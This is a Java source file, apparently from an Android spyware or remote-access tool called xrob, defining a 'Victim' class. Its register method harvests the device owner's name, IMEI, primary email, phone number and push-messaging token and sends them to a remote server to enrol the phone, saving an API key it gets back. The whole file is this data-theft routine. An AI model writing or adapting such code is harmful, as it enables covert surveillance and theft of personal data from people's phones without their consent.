package com.theah64.xrob.models;

import android.content.Context;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.PrefUtils;
import com.theah64.xrob.utils.ProfileUtils;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 11/9/16.
 */
public class Victim {

    private static final String KEY_NAME = "name";
    private static final String KEY_IMEI = "imei";
    private static final String KEY_EMAIL = "email";
    private static final String KEY_PHONE = "phone";
    public static final String KEY_FCM_ID = "fcm_id";
    private static final String X = Victim.class.getSimpleName();
    private static String apiKey = null;
    public static final String KEY_API_KEY = "api_key";

    public static void register(final Context context, @Nullable final JobListener jobListener) {

        if (jobListener != null) {
            jobListener.onJobStart();
        }
        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();
        final String imei = profileUtils.getIMEI();
        final String email = profileUtils.getPrimaryEmail();
        final String phone = profileUtils.getPhone();
        final String fcmId = PrefUtils.getInstance(context).getString(Victim.KEY_FCM_ID);

        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/in")
                .addParamIfNotNull(KEY_NAME, name)
                .addParam(KEY_IMEI, imei)
                .addParamIfNotNull(KEY_FCM_ID, fcmId)
                .addParamIfNotNull(KEY_EMAIL, email)
                .addParamIfNotNull(KEY_PHONE, phone)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
                if (jobListener != null) {
                    jobListener.onJobFailed(e.getMessage());
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {
                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);
                    setApiKey(apiKey);
                    //Saving in preference
                    PrefUtils.getInstance(context).getEditor().putString(Victim.KEY_API_KEY, apiKey).commit();

                    if (jobListener != null) {
                        jobListener.onJobFinish(apiKey);
                    }

                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();
                    if (jobListener != null) {
                        jobListener.onJobFailed(e.getMessage());
                    }
                }
            }
        });

    }

    public static void setApiKey(String apiKey) {
        Victim.apiKey = apiKey;
    }

    public static String getAPIKey() {
        return apiKey;
    }
}
